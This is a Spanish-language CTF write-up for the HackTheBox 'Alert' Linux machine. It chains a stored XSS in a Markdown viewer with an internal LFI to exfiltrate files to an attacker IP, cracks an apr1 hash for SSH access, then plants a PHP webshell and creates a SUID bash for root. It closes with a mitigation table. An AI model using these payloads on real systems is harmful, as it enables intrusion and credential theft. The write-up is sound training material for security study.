@@ -1,0 +1,198 @@
+---
+title: "Alert"
+platform: "HackTheBox"
+os: "Linux"
+difficulty: "Easy"
+date: 2026-10-20
+ports: ["22/ssh", "80/http"]
+tags: ["web", "xss", "lfi", "path-traversal", "htpasswd", "john", "php", "localhost-service", "suid"]
+summary: "XSS almacenado en un visor de Markdown que, abierto por un bot administrador, encadena con un LFI interno en messages.php para exfiltrar el .htpasswd de un vhost protegido. El hash apr1 crackeado da acceso SSH como albert. Root mediante un servicio PHP que corre como root en localhost:8080 e incluye un configuration.php escribible por el grupo management."
+---
+
+## Resumen
+
+Alert es una máquina Linux de dificultad *easy* cuyo foothold destaca por combinar **dos vulnerabilidades que por separado no bastan**: un XSS almacenado en un visor de Markdown y un LFI que solo responde en contexto interno. La gracia está en usar el navegador de un bot administrador como *proxy de lectura* para alcanzar ficheros que desde fuera no son accesibles.
+
+La escalada a root abusa de un servicio PHP de monitorización que escucha solo en `127.0.0.1:8080`, corre como `root` e incluye un fichero de configuración escribible por un grupo al que pertenece el usuario comprometido.
+
+<Callout type="note">
+Lección transversal: una vulnerabilidad "de bajo impacto" (un XSS self-only con cookie `HttpOnly`) se vuelve crítica cuando existe un actor con más privilegios que visita tu contenido. El contexto de ejecución importa tanto como la vulnerabilidad.
+</Callout>
+
+## Reconocimiento
+
+### Escaneo de puertos
+
+```text
+22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp    open     http    Apache httpd 2.4.41 (Ubuntu)
+12227/tcp filtered unknown
+```
+
+El puerto 80 redirige a `http://alert.htb/`, señal de **virtual hosting**. Añadimos el dominio a `/etc/hosts`.
+
+### Enumeración de vhosts
+
+```bash
+ffuf -u http://alert.htb -H "Host: FUZZ.alert.htb" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 20
+```
+
+Aparece `statistics.alert.htb` devolviendo **401 Unauthorized** (HTTP Basic Auth). Lo anotamos como objetivo que requiere credenciales — no se ataca por fuerza bruta.
+
+### Enumeración de contenido
+
+El sitio principal es un **Markdown Viewer**. `gobuster` revela la estructura real:
+
+```text
+index.php    (302 --> index.php?page=alert)
+contact.php
+messages.php
+uploads/
+messages/
+```
+
+Dos observaciones clave:
+
+- `index.php?page=X` carga páginas por parámetro (`page=messages`, `page=contact`...).
+- `messages.php` existe pero devuelve vacío ante peticiones directas con `curl`.
+
+<Callout type="tip">
+El visor renderiza cada Markdown que subes y te lo devuelve como HTML. Markdown admite **HTML embebido**: si el servidor no sanitiza, una etiqueta `<script>` se ejecuta → XSS almacenado.
+</Callout>
+
+## Foothold
+
+### 1. Confirmar el XSS almacenado
+
+Subimos un `.md` con una prueba de concepto y confirmamos que el `<script>` se ejecuta al renderizar. La cookie de sesión es `HttpOnly` (no exfiltrable), pero eso no importa: el objetivo no es robar sesión, sino **usar el navegador del bot como proxy**.
+
+### 2. El LFI interno en messages.php
+
+`messages.php?file=` no responde a peticiones externas, pero sí cuando lo invoca el navegador del administrador *desde dentro*. El payload Markdown hace que el bot lea un fichero vía LFI y nos exfiltre el contenido a nuestro servidor:
+
+```html
+# test
+<script>
+fetch("http://alert.htb/messages.php?file=../../../../../../etc/passwd")
+  .then(r => r.text())
+  .then(d => fetch("http://10.10.14.52:8000/?x=" + encodeURIComponent(d)));
+</script>
+```
+
+### 3. Entrega al bot
+
+Flujo de explotación:
+
+1. Subir el `.md` y obtener el enlace `visualizer.php?link_share=<id>.md`.
+2. Enviar ese enlace por el formulario **Contact Us** (`index.php?page=contact`).
+3. El bot abre el enlace → su navegador ejecuta el script → recibimos el fichero en nuestro `python3 -m http.server 8000`.
+
+<Callout type="warning">
+Usar `fetch()` y **no** `document.location`: `fetch` corre en segundo plano sin navegar fuera de la página, así el script completa la lectura y la exfiltración. Una redirección mataría la ejecución antes de tiempo.
+</Callout>
+
+La petición que llega desde la **IP de la máquina** (no la nuestra) confirma que fue el bot quien ejecutó el payload. Entre los usuarios con shell de `/etc/passwd` aparecen `albert` y `david`.
+
+### 4. Exfiltrar el .htpasswd del vhost protegido
+
+Cambiando el objetivo del LFI al fichero de credenciales de Apache del vhost `statistics`:
+
+```text
+file=../../../../../../var/www/statistics.alert.htb/.htpasswd
+```
+
+Obtenemos el hash:
+
+```text
+albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+```
+
+### 5. Crackear y acceder por SSH
+
+El prefijo `$apr1$` identifica un hash **Apache MD5 (apr1)**. John requiere forzar el formato para detectarlo bien:
+
+```bash
+john --format=md5crypt-long hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+La contraseña se reutiliza para SSH:
+
+```bash
+ssh albert@alert.htb
+cat /home/albert/user.txt
+```
+
+<Callout type="note">
+Si `john --show` dice "0 cracked" tras una pasada que parecía correr, suele ser ambigüedad de formato o un resultado cacheado en `~/.john/john.pot`. Forzar `--format` lo resuelve.
+</Callout>
+
+## Escalada de privilegios
+
+### Enumeración
+
+```bash
+sudo -l          # albert no puede usar sudo
+id               # groups=1000(albert),1001(management)
+netstat -tlnp    # 127.0.0.1:8080 escuchando solo en localhost
+```
+
+El proceso tras el 8080 corre **como root**:
+
+```text
+root  /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
+```
+
+<Callout type="tip">
+Un puerto alto `filtered` en el escaneo externo suele traducirse en un servicio que solo escucha en `127.0.0.1`. Tras el foothold, revisar siempre los sockets locales con `ss -tlnp` / `netstat -tlnp`.
+</Callout>
+
+### El vector
+
+El grupo `management` (al que pertenece `albert`) posee el directorio de configuración:
+
+```bash
+find /opt/website-monitor -group management
+# /opt/website-monitor/config
+# /opt/website-monitor/config/configuration.php
+```
+
+Y el `index.php` servido como root incluye ese fichero directamente:
+
+```php
+include('config/configuration.php');
+include(PATH.'/Parsedown.php');
+```
+
+Como podemos escribir en `configuration.php`, inyectamos PHP que se ejecutará como root al cargar la página. Usamos `>>` (append) para **no destruir** la constante `PATH` que el resto del script necesita:
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' >> /opt/website-monitor/config/configuration.php
+curl "http://127.0.0.1:8080/config/configuration.php?cmd=id"
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+### De RCE a root persistente
+
+En lugar de depender del webshell (el directorio puede restaurarse por un proceso root), creamos una copia SUID de bash, que sobrevive fuera de `/opt`:
+
+```bash
+curl -s "http://127.0.0.1:8080/config/configuration.php?cmd=cp%20/bin/bash%20/tmp/rootbash%3Bchmod%204755%20/tmp/rootbash"
+/tmp/rootbash -p
+cat /root/root.txt
+```
+
+<Callout type="warning">
+`system()` ejecuta a través de `/bin/sh` (dash en Ubuntu), que **no** entiende `/dev/tcp`. Para una reverse shell hay que envolver en `bash -c '...'` y urlencodear el payload. Para la flag, el SUID bash es más directo y robusto.
+</Callout>
+
+## Lecciones y mitigaciones
+
+| Fase | Causa raíz | Mitigación |
+|------|-----------|------------|
+| XSS almacenado | Markdown renderizado con HTML embebido sin sanitizar | Sanitizar la salida (allowlist de etiquetas, p. ej. DOMPurify / HTML Purifier) y cabecera CSP restrictiva |
+| LFI en `messages.php` | Parámetro `file` controlado por el usuario sin validación de ruta | Validar contra allowlist, usar `basename()`, confinar con `realpath()` dentro de un directorio base |
+| Exfiltración vía bot | Contenido no confiable abierto por un actor privilegiado | Aislar el navegador del bot, bloquear salidas de red, no renderizar HTML de usuarios |
+| Credenciales reutilizadas | Misma contraseña en `.htpasswd` y en SSH | Credenciales únicas por servicio; hashing robusto (apr1/MD5 está obsoleto) |
+| Servicio root en localhost | `php -S` como root sirviendo un directorio con ficheros escribibles por otro grupo | Ejecutar el servicio con el mínimo privilegio; ningún fichero incluido debe ser escribible por usuarios no privilegiados |
+| Privesc por `include` | `configuration.php` escribible por el grupo `management` | Permisos estrictos sobre todos los ficheros que el servidor web incluye o ejecuta |
